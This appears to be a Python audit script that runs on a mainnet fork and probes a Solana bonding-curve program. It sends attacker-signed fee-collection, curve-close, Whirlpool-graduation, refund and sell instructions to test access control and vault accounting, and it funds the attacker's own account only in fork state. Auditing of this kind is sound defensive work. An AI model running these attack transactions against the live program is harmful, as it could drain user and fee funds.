"""Last decisive Wavebreak batch: fee-custody claim, LP/position graduation CPI path, and the
token-refund payout on curves whose graduation window has closed.

Fixes the two earlier cases whose failure was a *setup* artifact rather than a program decision:
  * WB-G11 used an ATA that did not exist for the fee authority -> 6009 arithmetic error.
  * WB-GW1 never ran (timeout) -> the graduateWhirlpool CPI path is still unmeasured.
"""
import sys, json, struct, base64
sys.path.insert(0, "/home/user/orca-audit/tools")
import forknet as F
from solders.instruction import Instruction
from solders.pubkey import Pubkey

WB = "waveQX2yP3H1pVU8djGvEHmYg8uamQ84AuyGtpsrXTF"
WHIRL = "whirLbMiicVdio4qvUfM5KAg6Ct8VwpYzGff3uctyCc"
WCFG = "2LecshUwdy9xi7meFgHtFJQNSKk4KdTrcpvaB56dP2NQ"
FEE_AUTH = "8AbiHetkXXjkbUJe9XBLEaaGWvkJQbakJ746WQbi6Qor"
ACFG = "5yXDawwQ5s3hZXMJjLWryvDWsNKHYKqp6vkdSfgsaee4"
actor = F.load_actor(); A = str(actor.pubkey())
CURVES = {c["address"]: c for c in json.load(open("/home/user/orca-audit/recon/wb_curves.json"))}
CUST = {r["curve"]: r for r in json.load(open("/home/user/orca-audit/recon/wb_custody_full.json"))}


def prog_of(m):
    v = F.get_account(m) or F.rpc.rpc("getAccountInfo", [m, {"encoding": "base64"}],
                                     url="https://api.mainnet-beta.solana.com")["result"]["value"]
    return (v or {}).get("owner") or F.TOKEN


def ata_of(o, m, p):
    return str(Pubkey.find_program_address([bytes(F.pk(o)), bytes(F.pk(p)), bytes(F.pk(m))], F.pk(F.ATA))[0])


def pda(seeds, prog=WB):
    for b in range(255, -1, -1):
        try:
            return str(Pubkey.create_program_address(list(seeds) + [bytes([b])], F.pk(prog))), b
        except Exception:
            continue
    return None, None


def rd(a):
    v = F.get_account(a)
    if not v:
        return None
    raw = base64.b64decode(v["data"][0])
    o = {"lamports": v["lamports"], "space": v["space"], "hash": F.hashlib.sha256(raw).hexdigest()}
    if v["space"] == 165 and len(raw) >= 72:
        o["amount"] = struct.unpack_from("<Q", raw, 64)[0]
    if v["space"] == 2048 and len(raw) >= 224:
        o["quoteAmount"] = struct.unpack_from("<Q", raw, 208)[0]
        o["baseAmount"] = struct.unpack_from("<Q", raw, 216)[0]
    return o


def M(k, w=False, s=False):
    return F.AM(k, writable=w, signer=s)


RES = []


def case(name, ixs, watch, note=""):
    b = {a: rd(a) for a in watch}
    s0 = F.get_slot()
    r = F.send(ixs, actor)
    a = {x: rd(x) for x in watch}
    det = r.get("detail", {})
    logs = [l.strip() for l in det.get("logs", [])]
    d = {}
    for k in watch:
        bb, aa = b.get(k) or {}, a.get(k) or {}
        e = {}
        for f in ("lamports", "amount", "quoteAmount", "baseAmount"):
            if bb.get(f) is not None and bb.get(f) != aa.get(f):
                e[f] = [bb.get(f), aa.get(f), (aa.get(f) or 0) - (bb.get(f) or 0)]
        if e:
            d[k] = e
    rec = {"case": name, "note": note, "forkSlotBefore": s0, "forkSlotAfter": F.get_slot(),
           "sig": r.get("result"), "err": det.get("err") or r.get("error"), "logs": logs, "deltas": d,
           "attackerLamportsDelta": (a.get(A) or {}).get("lamports", 0) - (b.get(A) or {}).get("lamports", 0),
           "before": b, "after": a}
    RES.append(rec)
    print(f"\n### {name}   [{note}]")
    print("   err:", json.dumps(rec["err"])[:160])
    print("   logs:", " | ".join(l.split("log:")[-1].strip() for l in logs if "log:" in l or "failed" in l)[:300])
    print("   deltas:", json.dumps(d)[:600])
    return rec


def main():
    # ---- (a) fee custody: is the 6.78 SOL vault-over-accounting excess claimable by a non-authority?
    cand = sorted([(CUST[a]["divQuote"], a) for a, c in CURVES.items()
                   if c["quote_mint"] == F.WSOL and not any(m["graduated"] for m in c["graduation_methods"])
                   and CUST.get(a, {}).get("divQuote", 0) > 10 ** 8], reverse=True)
    for div, T in cand[:2]:
        c = CURVES[T]; BASE = c["base_mint"]
        VAULT = ata_of(T, F.WSOL, F.TOKEN)
        fee_ata = ata_of(FEE_AUTH, F.WSOL, F.TOKEN)
        # the fee-authority ATA may not exist; create it from the attacker (real account creation, no privilege)
        _, x = F.create_ata(FEE_AUTH, F.WSOL, F.TOKEN, A)
        F.send([x], actor)
        print(f"fee ATA exists: {bool(rd(fee_ata))}")
        cf = Instruction(F.pk(WB), bytes([49]), [
            M(A, w=True, s=True), M(FEE_AUTH), M(fee_ata, w=True), M(T, w=True), M(BASE, w=True),
            M(F.WSOL), M(VAULT, w=True), M(ACFG), M(F.SYSTEM), M(F.ATA), M(F.TOKEN)])
        case(f"WB-FEE1 collectFees by attacker on {T[:10]} (vault excess {div:,})", [cf],
             [A, fee_ata, T, VAULT, FEE_AUTH], "fee custody claim gate with every account existing")
        cr = Instruction(F.pk(WB), bytes([51]), [
            M(A, w=True, s=True), M(c["creator"]), M(FEE_AUTH), M(T, w=True), M(F.WSOL),
            M(VAULT, w=True), M(fee_ata, w=True), M(BASE, w=True), M(ACFG), M(F.TOKEN), M(F.TOKEN),
            M(F.SYSTEM), M(F.ATA)])
        case(f"WB-FEE2 bondingCurveClose by attacker on {T[:10]}", [cr], [A, fee_ata, T, VAULT],
             "close must move curve+vault rent to the fee authority, never the caller")

    # ---- (b) graduateWhirlpool: attacker signer on a live Whirlpool-method curve (full CPI account set)
    big = sorted([c for c in CURVES.values() if c["quote_mint"] == F.WSOL
                  and not any(m["graduated"] for m in c["graduation_methods"])
                  and any(m["label"] == 1 for m in c["graduation_methods"])],
                 key=lambda c: -c["quote_amount"])
    for c in big[:2]:
        T, BASE = c["address"], c["base_mint"]
        meth = [m for m in c["graduation_methods"] if m["label"] == 1][0]
        # read the whirlpool config fee tiers to get the tick spacing for the configured index
        cfgv = F.get_account(WCFG)
        tiers = []
        if cfgv:
            d = base64.b64decode(cfgv["data"][0])
            i = 4
            while i + 4 <= len(d):
                ft, ts = struct.unpack_from("<Hh", d, i)
                if ft == 0 and ts == 0:
                    break
                tiers.append((ft, ts)); i += 4
        idx = meth["fee_tier_index"]
        ts = tiers[idx][1] if idx < len(tiers) else 64
        print(f"\ncurve {T} method0 feeTierIndex={idx} -> feeTier {tiers[idx] if idx < len(tiers) else '?'} tickSpacing={ts}")
        pool = None
        for order in ((BASE, F.WSOL), (F.WSOL, BASE)):
            p_, _b = pda([b"whirlpool", bytes(F.pk(WCFG)), bytes(F.pk(order[0])), bytes(F.pk(order[1])),
                          struct.pack("<H", ts)], WHIRL)
            if p_ and F.get_account(p_):
                pool = p_; print("   live pool:", p_); break
        if pool is None:
            pool, _ = pda([b"whirlpool", bytes(F.pk(WCFG)), bytes(F.pk(BASE)), bytes(F.pk(F.WSOL)),
                           struct.pack("<H", ts)], WHIRL)
            print("   no existing pool; derived (would be created by the CPI):", pool)
        oracle, _ = pda([b"oracle", bytes(F.pk(pool))], WHIRL)
        pos_mint, _ = pda([b"position", bytes(F.pk(pool)), bytes([0])], WHIRL)
        position, _ = pda([b"position", bytes(F.pk(pos_mint))], WHIRL)
        lower, _ = pda([b"tick_array", bytes(F.pk(pool)), struct.pack("<I", 2 ** 32 - 128)], WHIRL)
        lockcfg, _ = pda([b"lock_config", bytes(F.pk(pos_mint))], WB)
        badge_q, _ = pda([b"token_badge", bytes(F.pk(F.WSOL)), bytes(F.pk(pool))], WHIRL)
        badge_b, _ = pda([b"token_badge", bytes(F.pk(BASE)), bytes(F.pk(pool))], WHIRL)
        init_auth, _ = pda([b"whirlpool_init_authority", bytes(F.pk(pool))], WB)
        escrow, _ = pda([b"lp_escrow", bytes(F.pk(meth["destination"]))], WB)
        dest = meth["destination"]
        bp = prog_of(BASE)
        VAULT = ata_of(T, F.WSOL, F.TOKEN)
        aq, ab = ata_of(A, F.WSOL, F.TOKEN), ata_of(A, BASE, bp)
        dq, db = ata_of(dest, F.WSOL, F.TOKEN), ata_of(dest, BASE, bp)
        for m_, p_ in ((BASE, bp),):
            _, x = F.create_ata(A, m_, p_, A); F.send([x], actor)
        gw = Instruction(F.pk(WB), bytes([32]), [
            M(A, w=True, s=True), M(dest, w=True), M(T, w=True), M(F.WSOL), M(VAULT, w=True),
            M(aq, w=True), M(dq, w=True), M(ata_of(pool, F.WSOL, F.TOKEN), w=True), M(BASE, w=True),
            M(ata_of(pool, BASE, bp), w=True), M(db, w=True), M(ata_of(pool, BASE, bp), w=True),
            M(WCFG), M(BASE), M(pool), M(oracle), M(position), M(pos_mint),
            M(ata_of(escrow, pos_mint, F.TOKEN22), w=True), M(ata_of(dest, pos_mint, F.TOKEN22), w=True),
            M(lower), M(lower), M(badge_q), M(badge_b), M(init_auth, w=True), M(T, w=True),
            M(lockcfg, w=True), M(F.SYSTEM), M(F.ATA), M(F.TOKEN), M(bp), M(F.TOKEN22), M(F.MEMO),
            M(WHIRL), M(F.RENT_SYSVAR)])
        case(f"WB-GW2 graduateWhirlpool by attacker on {T[:10]} (quote {c['quote_amount']:,} vs target {c['graduation_target']:,})",
             [gw], [A, aq, ab, T, VAULT, pool, position, escrow, dest],
             "does graduation need the creator/privilege, and can the LP escrow be pointed at the attacker?")

    # ---- (c) token_refund on curves whose graduation window has closed, attacker holding real base
    for T in ["B9wBisgXnZGzFdb9KLTuZnwmtg6t3V6pTsz6VoKP3P5p", "GPa2k37AsmeiHBCFxoKsneZxw4VLtqWVRsSmr3bo7gvA"]:
        c = CURVES[T]; BASE, QM = c["base_mint"], c["quote_mint"]
        qp, bp = prog_of(QM), prog_of(BASE)
        VAULT = ata_of(T, QM, qp); aq, ab = ata_of(A, QM, qp), ata_of(A, BASE, bp)
        for m_, p_ in ((QM, qp), (BASE, bp)):
            _, x = F.create_ata(A, m_, p_, A); F.send([x], actor)
        # fork-only fixture funding of the attacker's own base ATA
        mraw = bytearray(base64.b64decode(F.get_account(BASE)["data"][0]))
        sup = struct.unpack_from("<Q", mraw, 36)[0]; dec = mraw[44]
        fund = 10 ** (dec + 3)
        v = F.get_account(ab); raw2 = bytearray(base64.b64decode(v["data"][0]))
        struct.pack_into("<Q", raw2, 64, fund)
        F.rpc.rpc("surfnet_setAccount", [ab, {"lamports": v["lamports"], "data": bytes(raw2).hex(),
                                              "owner": v["owner"], "executable": False}], url=F.FORK)
        F.rpc.rpc("surfnet_setSupply", [BASE, {"total": str(sup + fund)}], url=F.FORK)
        watch = [A, aq, ab, T, VAULT, BASE]
        rf = Instruction(F.pk(WB), bytes([12]), [M(A, w=True, s=True), M(T, w=True), M(QM), M(VAULT, w=True),
                                                 M(aq, w=True), M(BASE, w=True), M(ab, w=True),
                                                 M(F.SYSTEM), M(bp), M(qp), M(F.ATA)])
        rec = case(f"WB-RF1 tokenRefund on {T[:10]} (gradTime={c['graduation_time']:,}, quote {c['quote_amount']:,})",
                   [rf], watch, "refund payout vs accounting on a closed-window curve")
        rec["fixture"] = {"fundedBase": fund, "decimals": dec, "supplyBefore": sup,
                          "note": "fork-only funding of the attacker's own ATA; not exploit evidence"}
        sell = Instruction(F.pk(WB), bytes([10]) + struct.pack("<QB", fund // 4, 0) + b"\x00", [
            M(A, w=True, s=True), M(T, w=True), M(BASE, w=True), M(ab, w=True), M(QM), M(VAULT, w=True),
            M(aq, w=True), M(F.SYSTEM), M(F.ATA), M(bp), M(qp)])
        r2 = case(f"WB-RF2 sell on {T[:10]} (curve state: quote {c['quote_amount']:,})", [sell], watch,
                  "does a sell on a closed-window curve pay out of the vault beyond accounting?")
        b0, a0 = r2["before"].get(T) or {}, r2["after"].get(T) or {}
        v0, v1 = (r2["before"].get(VAULT) or {}).get("amount", 0), (r2["after"].get(VAULT) or {}).get("amount", 0)
        rel = a0.get("quoteAmount") is not None and b0.get("quoteAmount") - a0.get("quoteAmount")
        paid = (r2["after"].get(aq) or {}).get("amount", 0) - (r2["before"].get(aq) or {}).get("amount", 0)
        r2["conservation"] = {"accountingDecrease": rel, "vaultDecrease": (v0 - v1), "callerGain": paid,
                              "excessCaptured": (v0 - v1) - (rel or 0)}
        print("   ->", json.dumps(r2["conservation"]))

    json.dump({"results": RES}, open("/home/user/orca-audit/evidence/WBZ_final3.json", "w"), indent=1)
    print("\nsaved evidence/WBZ_final3.json")


if __name__ == "__main__":
    main()
